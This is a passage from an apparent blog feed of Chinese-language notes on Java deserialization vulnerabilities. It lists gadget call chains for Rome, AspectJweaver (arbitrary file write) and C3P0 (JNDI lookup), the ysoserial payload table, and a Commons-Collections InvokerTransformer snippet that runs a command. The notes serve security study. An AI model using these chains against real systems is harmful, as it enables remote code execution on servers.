title="image-20230606112116432"><p>想要触发beanHashCode()就需要触发hashCode()，CC链中也提到**HashMap.readObject()**可以触发任意类的hashcode()方法。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectBean</span>.</span></span>hashcode<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EqualsBean</span>.</span></span>bean<span class="hljs-constructor">HashCode()</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="x3D-gt-obj-beanEquals"><a href="#x3D-gt-obj-beanEquals" class="headerlink" title="? &#x3D;&gt; obj.beanEquals()"></a>? &#x3D;&gt; obj.beanEquals()</h3><img src="/2023/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%8C/image-20230606142652487.png" class="" title="image-20230606142652487"><p>HashMap.readObject()同样可以触发任意Map的equals()方法，借助AbstractMap即可触发任意类的equals()方法：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-constructor">Val()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractMap</span>.</span></span>equals<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EqualsBean</span>.</span></span>equals<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EqualsBean</span>.</span></span>bean<span class="hljs-constructor">Equals()</span><br><br></code></pre></td></tr></table></figure><h2 id="Rome1"><a href="#Rome1" class="headerlink" title="Rome1"></a>Rome1</h2><ul><li>DEP：rome:1.0</li><li>IN：HashMap.readObject()</li><li>OUT：ToStringBean.toString()</li><li>SINK：Templates</li></ul><blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectBean</span>.</span></span>hashcode<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EqualsBean</span>.</span></span>bean<span class="hljs-constructor">HashCode()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectBean</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ToStringBean</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BeanIntrospector</span>.</span></span>get<span class="hljs-constructor">PropertyDescriptors()</span> ==&gt; getter<br>&lt;Templates&gt;<br></code></pre></td></tr></table></figure></blockquote><h2 id="Rome2"><a href="#Rome2" class="headerlink" title="Rome2"></a>Rome2</h2><ul><li>DEP：rome:1.0</li><li>IN：BadAttributeValueExpException.readObject()</li><li>OUT：ToStringBean.toString()</li><li>SINK：Templates</li></ul><blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BadAttributeValueExpException</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectBean</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ToStringBean</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BeanIntrospector</span>.</span></span>get<span class="hljs-constructor">PropertyDescriptors()</span> ==&gt; getter<br>&lt;Templates&gt;<br></code></pre></td></tr></table></figure></blockquote><h2 id="Rome3"><a href="#Rome3" class="headerlink" title="Rome3"></a>Rome3</h2><ul><li>DEP：rome:1.0</li><li>IN：HashMap.readObject()</li><li>OUT：EqualsBean.beanEquals()</li><li>SINK：Templates</li></ul><blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-constructor">Val()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractMap</span>.</span></span>equals<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EqualsBean</span>.</span></span>equals<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EqualsBean</span>.</span></span>bean<span class="hljs-constructor">Equals()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BeanIntrospector</span>.</span></span>get<span class="hljs-constructor">PropertyDescriptors()</span> ==&gt; getter<br>&lt;Templates&gt;<br></code></pre></td></tr></table></figure></blockquote><h1 id="AspectJweaver利用链"><a href="#AspectJweaver利用链" class="headerlink" title="AspectJweaver利用链"></a>AspectJweaver利用链</h1><h2 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h2><p>这条链前半部分依然是触发到LazyMap.get()，因此这部分可以用CC链中已有的内容随意改造。后半部分LazyMap.get()触发到的是一个位于<code>org.aspectj.weaver.tools.cache</code>的特殊Map的put()方法，也就是静态内部类<code>SimpleCache$StoreableCachingMap.put()</code>。这个内部类会继续调用<code>writeToPath()</code>最终直接写入任意文件至任意路径。</p><img src="/2023/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%8C/image-20230606151726302.png" class="" title="image-20230606151726302"><img src="/2023/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%8C/image-20230606151737709.png" class="" title="image-20230606151737709"><h2 id="AspectJweaver1"><a href="#AspectJweaver1" class="headerlink" title="AspectJweaver1"></a>AspectJweaver1</h2><ul><li>DEP：aspectjweaver:1.9.2&amp;&amp;commons-collections:3.2.2</li><li>IN：HashSet.readObject()</li><li>OUT：LazyMap.get()</li><li>SINK：FileOutputStream.write()</li></ul><blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SimpleCache$StorableCachingMap</span>.</span></span>put<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SimpleCache$StorableCachingMap</span>.</span></span>write<span class="hljs-constructor">ToPath()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">FileOutputStream</span>.</span></span>write<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure></blockquote><h1 id="C3P0利用链"><a href="#C3P0利用链" class="headerlink" title="C3P0利用链"></a>C3P0利用链</h1><h2 id="前置知识-3"><a href="#前置知识-3" class="headerlink" title="前置知识"></a>前置知识</h2><p>观察类<code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase</code>的序列化与反序列化过程。</p><h3 id="PoolBackedDataSourceBase-writeObject"><a href="#PoolBackedDataSourceBase-writeObject" class="headerlink" title="PoolBackedDataSourceBase.writeObject()"></a>PoolBackedDataSourceBase.writeObject()</h3><img src="/2023/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%8C/image-20230606202541032.png" class="" title="image-20230606202541032"><p>如果捕捉到<code>NotSerializableException</code>异常就会进入下方红框的处理逻辑，<code>indirectForm(this.connectionPoolDataSource)</code>返回了<code>ReferenceSerialized</code>对象：</p><img src="/2023/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%8C/image-20230606202909434.png" class="" title="image-20230606202909434"><p>因此序列化的过程可以将connectionPoolDataSource转换为ReferenceSerialized并写入ObjectOutputStream。</p><h3 id="PoolBackedDataSourceBase-readObject"><a href="#PoolBackedDataSourceBase-readObject" class="headerlink" title="PoolBackedDataSourceBase.readObject()"></a>PoolBackedDataSourceBase.readObject()</h3><p>首先会调用getObject，也就是我们写入的<code>ReferenceSerialized.getObject()</code>。</p><img src="/2023/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%8C/image-20230606203122484.png" class="" title="image-20230606203122484"><p>然后直接调用到<code>InitialContext.lookup(this.contextName)</code>。</p><img src="/2023/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%8C/image-20230606203319048.png" class="" title="image-20230606203319048"><h2 id="C3P0-1"><a href="#C3P0-1" class="headerlink" title="C3P0-1"></a>C3P0-1</h2><ul><li>DEP：c3p0:0.9.5.2 &amp;&amp; mchange-commons-java:0.2.11</li><li>IN：PoolBackedDataSourceBase.readObject()</li><li>OUT：ReferenceSerialized.getObject()</li><li>SINK：RegistryContext.lookup()</li></ul><blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PoolBackedDataSourceBase</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReferenceIndirector$ReferenceSerialized</span>.</span></span>get<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RegistryContext</span>.</span></span>lookup<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure></blockquote>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CB</tag>
      
      <tag>Rome</tag>
      
      <tag>AspectJweaver</tag>
      
      <tag>C3P0</tag>
      
      <tag>JRMP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>security_issues_in_Go</title>
    <link href="/2023/05/28/security-issues-in-Go/"/>
    <url>/2023/05/28/security-issues-in-Go/</url>
    
    <content type="html"><![CDATA[<h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><p><a href="https://blog.csdn.net/weixin_54902210/article/details/125419981">CTF—Go题目复现_go ssti_Sentiment.的博客-CSDN博客</a></p><p><a href="https://bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">golang的一些安全问题 - byc_404’s blog (bycsec.top)</a></p><p><a href="https://github.com/Tencent/secguide/blob/main/Go%E5%AE%89%E5%85%A8%E6%8C%87%E5%8D%97.md">secguide&#x2F;Go安全指南.md at main · Tencent&#x2F;secguide · GitHub</a></p><p><a href="https://github.com/he1m4n6a/Go_Security_Study">GitHub - he1m4n6a&#x2F;Go_Security_Study: golang安全学习总结</a></p><p><a href="https://github.com/HackGolang/HackGolang">GitHub - HackGolang&#x2F;HackGolang: 《Go语言安全-只有Go安全才能拯救地球》Only Golang Security Can Save The Earth.</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化漏洞一</title>
    <link href="/2023/05/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%80/"/>
    <url>/2023/05/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>​反序列化漏洞是web安全中老生常谈的问题，提及序列化与反序列化首先有几个问题可以探讨一下：</p><ul><li><strong>为什么需要序列化与反序列化？</strong></li><li><strong>序列化与反序列化支持传递哪些信息？</strong></li><li><strong>序列化后的数据以什么样的格式传递？以何种方式解析？</strong></li></ul><p>下面逐一回答。</p><h3 id="1-为什么需要序列化与反序列化？"><a href="#1-为什么需要序列化与反序列化？" class="headerlink" title="1.为什么需要序列化与反序列化？"></a>1.为什么需要序列化与反序列化？</h3><p>​(1)持久化：对象是存储在内存中的堆区的，但是如果内存停止使用了，对象也不存在了。序列化可以将对象转化成字节序列，可以写进硬盘文件中实现持久化。在其它的内存空间中可以读取字节序列进行反序列化成对象。</p><p>​(2)网络传输：网络直接传输数据，但是无法直接传输对象，可在传输前序列化，传输完成后反序列化成对象。所以所有可在网络上传输的对象都必须是可序列化的。</p><h3 id="2-序列化与反序列化支持传递哪些信息？"><a href="#2-序列化与反序列化支持传递哪些信息？" class="headerlink" title="2.序列化与反序列化支持传递哪些信息？"></a>2.序列化与反序列化支持传递哪些信息？</h3><p>​主要包含了对象的类型信息、对象的数据等。一般来讲对于一个对象，可序列化的信息仅有成员属性以及变量类型，不能序列化方法。但有一个例外就是python的pickle模块，pickle序列化字节流中包含opcode，opcode可以实现方法，因此pickle序列化可以传递方法。</p><h3 id="3-序列化后的数据以什么样的格式传递？以何种方式解析？"><a href="#3-序列化后的数据以什么样的格式传递？以何种方式解析？" class="headerlink" title="3.序列化后的数据以什么样的格式传递？以何种方式解析？"></a>3.序列化后的数据以什么样的格式传递？以何种方式解析？</h3><p>​在不同语言环境下，对象经过序列化后可以有多种格式，简单列举几个：</p><ul><li>php序列化字符串</li><li>Java序列化字节流</li><li>pickle序列化字节流(opcode)</li><li>json、yaml、xml</li></ul><h2 id="Java中的序列化与反序列化"><a href="#Java中的序列化与反序列化" class="headerlink" title="Java中的序列化与反序列化"></a>Java中的序列化与反序列化</h2><p>​writeObject()&amp;readObject()</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><h3 id="原生反序列化"><a href="#原生反序列化" class="headerlink" title="原生反序列化"></a>原生反序列化</h3><p>代码中出现了不安全的原生反序列化接口<code>readObject()</code>就会造成反序列化漏洞，在不同的依赖环境下反序列化利用链也各不相同，常见的可能造成原生反序列化漏洞的危险依赖见项目：<a href="https://github.com/frohoff/ysoserial">ysoserial</a>。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs sh">Payload             Authors                     Dependencies<br>-------             -------                     ------------<br>AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2<br>BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5<br>C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11<br>Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0<br>Clojure             @JackOfMostTrades           clojure:1.8.0<br>CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2<br>CommonsCollections1 @frohoff                    commons-collections:3.1<br>CommonsCollections2 @frohoff                    commons-collections4:4.0<br>CommonsCollections3 @frohoff                    commons-collections:3.1<br>CommonsCollections4 @frohoff                    commons-collections4:4.0<br>CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1<br>CommonsCollections6 @matthias_kaiser            commons-collections:3.1<br>CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1<br>FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4<br>Groovy1             @frohoff                    groovy:2.3.9<br>Hibernate1          @mbechler<br>Hibernate2          @mbechler<br>JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21<br>JRMPClient          @mbechler<br>JRMPListener        @mbechler<br>JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1<br>JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21<br>Jdk7u21             @frohoff<br>Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2<br>MozillaRhino1       @matthias_kaiser            js:1.7R2<br>MozillaRhino2       @_tint0                     js:1.7R2<br>Myfaces1            @mbechler<br>Myfaces2            @mbechler<br>ROME                @mbechler                   rome:1.0<br>Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE<br>Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2<br>URLDNS              @gebl<br>Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14<br>Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4<br></code></pre></td></tr></table></figure><p>实际中的反序列化漏洞例如shiro反序列化、weblogic反序列化、dubbo反序列化都属于原生反序列化漏洞。</p><blockquote><p>dubbo需要开启NativeJava才能执行原生反序列化，开启的方式便是<a href="https://xz.aliyun.com/t/12333">最新CVE</a>的一个BUG。</p></blockquote><h3 id="其它协议"><a href="#其它协议" class="headerlink" title="其它协议"></a>其它协议</h3><p>除了原生反序列化之外，还有一些项目支持面向对象的二进制序列化与反序列化，比如**<a href="http://hessian.caucho.com/doc/hessian-serialization.html">Hessian协议</a>**。它使用<code>HessianInput/HessianOutput</code>、<code>Hessian2Input/Hessian2Output</code>、<code>BurlapInput/BurlapOutput</code>这些方法对对象进行封装自传输。</p><p><strong>@TODO</strong>  关于Hessian反序列化后续会专门写个小文章学习。</p><h1 id="CC链前置知识"><a href="#CC链前置知识" class="headerlink" title="CC链前置知识"></a>CC链前置知识</h1><h2 id="xxxTransfomer"><a href="#xxxTransfomer" class="headerlink" title="xxxTransfomer"></a>xxxTransfomer</h2><p>在<code>org.apache.commons.collections.functors</code>这个package中有很多xxxTransformer，简单介绍几个。</p><ul><li>InvokerTransformer：利用反射的方式执行代码，需要调用<code>transform()</code>触发。</li><li>ChainedTransformer：组合多个Transformer，前一个回调的结果作为后一个回调的输入。</li><li>ConstantTransformer：将任一类转换为<code>ConstantTransformer</code>返回。</li><li>InstantiateTransformer：其<code>transform()</code>会反射调用任意类构造器的<code>newInstance()</code>。</li></ul><p>利用xxxTransformer执行<code>Runtime.getRuntime.exec(&#39;clac.exe&#39;)</code>的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">        Transformer[] transformers = &#123;<br><span class="hljs-comment">//              new ConstantTransformer(Runtime.class),</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure><h2 id="TemplateImpl"><a href="#TemplateImpl" class="headerlink" title="TemplateImpl"></a>TemplateImpl</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-title function_">TemplatesImpl</span><span class="hljs-params">(<span class="hljs-type">byte</span>[][] bytecodes, String transletName, Properties outputProperties, <span class="hljs-type">int</span> indentNumber, TransformerFactoryImpl tfactory)</span> &#123;<br>    <span class="hljs-built_in">this</span>._bytecodes = bytecodes;<br>    <span class="hljs-built_in">this</span>._name = transletName;<br>    <span class="hljs-built_in">this</span>._outputProperties = outputProperties;<br>    <span class="hljs-built_in">this</span>._indentNumber = indentNumber;<br>    <span class="hljs-built_in">this</span>._tfactory = tfactory;<br>&#125;<br></code></pre></td></tr></table></figure><p>在ClassLoader中我们提到，利用defineClass()可以加载字节码，<code>TemplateImpl.newTransfomer()</code>允许我们加载任意字节码，调用顺序是：</p><blockquote><p>newTransformer() </p><p>​ getTransletInstance() </p><p>​defineTransletClasses() </p><p>​ClassLoader.defineClass()</p></blockquote><p>具体实现需要注意：</p><ul><li><code>_name</code>不为空</li><li><code>_bytecodes</code>存放字节码</li><li><code>_tfactory</code>必须是TransformerFactoryImpl类</li><li>加载的类必须是AbstractTranslet的子类</li></ul><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>动态代理是设计模式中代理模式的一种，代理模式的定义是：由于某些原因需要给某对象<strong>提供一个代理以控制对该对象的访问</strong>。这时，访问对象不适合或者不能直接引用目标对象，代理对象作为访问对象和目标对象之间的中介。<strong>动态代理使用反射机制在运行时为对象添加代理接口。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**为HashMap做动态代理，hook HashMap.get()。**/</span><br><span class="hljs-comment">//ExampleInvocationHandler.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExampleInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-keyword">protected</span> Map map;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ExampleInvocationHandler</span><span class="hljs-params">(Map map)</span>&#123;<br>        <span class="hljs-built_in">this</span>.map=map;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-keyword">if</span>(method.getName().compareTo(<span class="hljs-string">&quot;get&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;Hooked method:&quot;</span>+method.getName()+<span class="hljs-string">&quot;\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Object hacked!&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-built_in">this</span>.map,args);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//App.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ExampleInvocationHandler</span> <span class="hljs-variable">exampleInvocationHandler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExampleInvocationHandler</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>());<br>        <span class="hljs-comment">//核心：创建代理类</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, exampleInvocationHandler);<br>        proxyMap.put(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;spring&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> (String) proxyMap.get(<span class="hljs-string">&quot;name&quot;</span>);<br>        System.out.println(result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Common-Collections利用链"><a href="#Common-Collections利用链" class="headerlink" title="Common-Collections利用链"></a>Common-Collections利用链</h1><h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><p>对CC链做一个简单的汇总，入口指原生反序列化调用readObject()的类，出口指下一步链接至触发点的类，触发点指触发执行的类。</p><h3 id="入口"><a href="#入口" class="headerlink" 